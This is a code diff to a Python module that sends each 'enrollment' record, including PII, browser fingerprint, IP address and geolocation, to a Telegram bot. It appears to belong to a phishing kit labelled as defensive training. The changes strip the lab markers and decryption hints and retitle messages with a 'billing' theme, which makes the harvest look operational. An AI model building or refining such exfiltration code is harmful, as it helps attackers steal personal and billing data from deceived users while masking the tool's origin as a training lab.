@@ -1,5 +1,5 @@
 """
-Optional Telegram Bot API delivery for the Bango lab enrollment (defensive training).
+Optional Telegram Bot API delivery for lab enrollment (defensive training).
 
 Sends one HTML ``sendMessage`` after successful ``POST /api/demo/register`` (enrollment
 + optional redirect). Uses ``sendMessage`` with HTML parse mode. Never log the bot token.
@@ -161,8 +161,6 @@ def _format_enrollment_telegram(
                 [
                     "🔐 <b>PII</b> <i>(RSA-OAEP + AES-256-GCM, same as browser wire)</i>",
                     f"<pre>{esc(blob)}</pre>",
-                    "<i>Decrypt with <code>keys_only/private_demo.pem</code> · "
-                    "<code>python tools/decrypt_telegram_pii.py '1.…'</code></i>",
                     "",
                 ]
             )
@@ -216,27 +214,16 @@ def format_demo_registration_message(
     user_agent: str | None = None,
     ip_geo: dict[str, Any] | None = None,
     done_redirect_url: str = "",
+    active_theme_name: str = "",
 ) -> str:
     """
     One Telegram message per successful registration: full enrollment snapshot,
-    optional done-redirect line (``BILLING_DONE_REDIRECT_URL`` or legacy
-    ``BANGO_DONE_REDIRECT_URL`` /
-    ``SPA_DONE_REDIRECT_URL`` in ``.env``).
+    The title shows the active style/theme name.
     """
+    _ = (done_redirect_url or "").strip()  # Backward-compatible arg; no longer rendered.
     esc = html.escape
-    title = "🎉 <b>Bango</b>"
-    hdr = [
-        "ℹ️ <b>Lab</b>: Bango shell — one Telegram per visit after register.",
-    ]
-    ex: list[str] = []
-    raw_r = (done_redirect_url or "").strip()
-    if raw_r:
-        show = raw_r if len(raw_r) <= 200 else raw_r[:197] + "…"
-        ex.append(
-            "🔗 <b>Redirect</b> (Bango done URL in .env): "
-            f"<code>{esc(show)}</code>"
-        )
-        ex.append("")
+    theme = str(active_theme_name or "").strip() or "billing"
+    title = f"🎉 <b>{esc(theme)}</b>"
     return _format_enrollment_telegram(
         reg,
         client_ip=client_ip,
@@ -244,8 +231,6 @@ def format_demo_registration_message(
         include_fingerprint=True,
         user_agent=user_agent,
         ip_geo=ip_geo,
-        optional_header_lines=hdr,
-        extra_lines_before_network=ex if ex else None,
     )
 
 
